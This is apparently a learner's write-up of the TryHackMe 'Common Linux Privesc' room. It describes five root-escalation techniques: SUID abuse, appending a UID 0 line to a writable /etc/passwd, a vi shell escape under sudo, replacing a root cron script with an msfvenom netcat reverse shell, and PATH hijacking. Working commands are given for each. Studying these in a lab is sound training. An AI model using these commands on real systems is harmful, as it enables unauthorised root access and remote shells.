# Linux Privilege Escalation — The Ghost

**Date:** 09.04.2026
**Platform:** TryHackMe
**Room:** Common Linux Privesc
**Difficulty:** Medium
**Status:** ✅ Completed

## The Creature

Already inside. Already past the first door.
But locked in the basement.
The Ghost finds what administrators forgot.
Enters as nobody. Leaves as root.
If we are root — we are everywhere.

## What is Privilege Escalation

Going from lower permissions to higher permissions.
Exploiting a vulnerability, design flaw,
or configuration oversight to gain access
to resources normally restricted.

Two directions:
HORIZONTAL — same level, different user
             (inherit their files and access)
VERTICAL   — lower to higher
             (www-data → root)

## Enumeration First — Always

Before any exploit, map the territory.
Tool: LinEnum.sh — automated enumeration script.

Key things LinEnum reveals:
→ Kernel version (kernel exploits?)
→ World-writable sensitive files
→ SUID binaries
→ Cron jobs running as root
→ Users and their groups

Manual commands that matter:
whoami          — who am I right now?
sudo -l         — what can I run as root?
cat /etc/passwd — who else is on this system?
uname -a        — kernel version
cat /etc/crontab — scheduled root tasks
find / -perm -u=s -type f 2>/dev/null — SUID files

## Exploitation Techniques

### 1. SUID Binary Abuse

Found: /home/user3/shell

Why it worked:
The file had the SUID bit set and owner was root.
SUID = file runs with owner's permissions.
Owner = root.
Therefore: anyone who runs this file
gets root permissions automatically.

Command used:
./shell
→ root shell obtained

How to find SUID files:
find / -perm -u=s -type f 2>/dev/null

Permission to look for: rws-rwx-rwx
The 's' instead of 'x' = SUID bit set.

Reference: gtfobins.github.io
Every binary. Every exploit method. All in one place.

### 2. Writable /etc/passwd

Found: /etc/passwd was world-writable.
User7 was member of root group (gid 0).

Why /etc/passwd matters:
It stores all user accounts on the system.
Format per line:
username:password:UID:GID:info:home:shell

Why UID 0:
UID 0 is reserved for root.
Any user with UID 0 = root privileges.
The system doesn't check the username — only the UID.

Attack chain:
Step 1 — generate password hash:
openssl passwd -1 -salt new 123
→ $1$new$p7ptkEKU1HnaHpRtzNizS1

Step 2 — create new root user entry:
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

Step 3 — append to /etc/passwd:
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd

Step 4 — login as new user:
su new
→ root shell obtained

This works because the system reads UID.
UID 0 = root. Username is just a label.

### 3. Sudo Misconfiguration — Vi Escape

Found via: sudo -l
User8 can run vi as root with NOPASSWD.

NOPASSWD = no password required.
Vi runs as root.
Vi can execute shell commands.

Exploit:
sudo vi
:!sh
→ root shell obtained

Why it works:
Vi's :! command runs shell commands
with the same privileges as the vi process.
Vi runs as root → shell runs as root.

Rule: always run sudo -l on every account.
Misconfigured sudo = instant escalation.

Reference: gtfobins.github.io/gtfobins/vi/

### 4. Cron Job Exploitation

Found: autoscript.sh runs every 5 minutes as root.
Location: /home/user4/Desktop/autoscript.sh
Problem: file is writable by current user.

Attack chain:
Step 1 — create reverse shell payload:
msfvenom -p cmd/unix/reverse_netcat
lhost=LOCALIP lport=8888 R

Step 2 — replace script contents:
echo [PAYLOAD] > autoscript.sh

Step 3 — start listener:
nc -lvnp 8888

Step 4 — wait 5 minutes for cron to execute.
→ root shell lands in netcat session.

Why it works:
Cron runs the script as root on schedule.
We control the script's contents.
Therefore we control what root executes.

### 5. PATH Variable Manipulation

Found: SUID binary in user5's home calls 'ls'.
Problem: PATH variable is controllable.

Why the system ran our file:
Linux searches for commands by scanning
PATH directories from left to right.
First match wins.

Attack chain:
Step 1 — create fake 'ls' in /tmp:
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls

Step 2 — prepend /tmp to PATH:
export PATH=/tmp:$PATH

Step 3 — run the SUID binary:
./script
→ binary calls 'ls'
→ system finds /tmp/ls first
→ executes /bin/bash as root

Reset PATH after exploit:
export PATH=/usr/local/sbin:/usr/local/bin:
/usr/sbin:/usr/bin:/sbin:/bin:$PATH

## The Five Ventilation Shafts

SUID files      → runs as owner (root)
/etc/passwd     → add UID 0 user
Sudo misconfig  → escape to shell
Cron jobs       → replace writable scripts
PATH hijacking  → fake the binary

All five share the same root cause:
administrator misconfiguration.
Not a zero-day. Not a sophisticated exploit.
Just a forgotten permission. A missed setting.
One oversight = full system compromise.

## Key Tools

LinEnum.sh      → automated enumeration
GTFOBins        → binary exploitation reference
msfvenom        → payload generation
netcat (nc)     → catch reverse shells
find            → locate SUID files manually
sudo -l         → check sudo permissions

## What Surprised Me

None of these required sophisticated exploits.
SUID file — just run it.
/etc/passwd — just append a line.
Vi escape — two characters: :!sh
Cron — just replace the script.
PATH — just prepend a directory.

The most powerful attacks are often
the simplest ones.
Complexity hides in the misconfiguration —
not in the exploit.

## Open Questions

- How does LinPEAS differ from LinEnum?
  Which is more thorough?
- What is DirtyCow (CVE-2016-5195)?
  How does kernel exploitation differ
  from misconfiguration exploitation?
- How do defenders detect PrivEsc attempts?
  What logs are generated?
- What is the Windows equivalent
  of each technique here?

## Tags
linux, privilege-escalation, privesc, suid,
passwd, sudo, cron, path-hijacking,
linenum, gtfobins, msfvenom, netcat,
root, tryhackme, enumeration